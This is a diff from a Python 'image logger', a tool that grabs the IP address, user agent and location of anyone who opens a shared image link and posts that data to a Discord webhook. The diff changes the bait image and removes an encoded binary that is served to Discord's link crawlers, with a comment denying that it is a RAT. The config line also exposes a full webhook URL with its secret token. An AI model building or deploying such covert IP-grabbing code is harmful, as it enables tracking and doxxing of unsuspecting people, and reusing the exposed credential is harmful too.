@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1336100747645030421/W6xsKzJSitWfa2q4lAj2UkFS1wIwi9YIZppyf86s9eVtBGxxvZVsFshNrJTD8I8Kmsjy",
-    "image": "https://i.scdn.co/image/ab67616d00001e02d9e5fbf73c4f324885cecbb9", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/rJKQXqWwqx8AAAAC/don%27t-middle.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -178,13 +178,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
-}
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
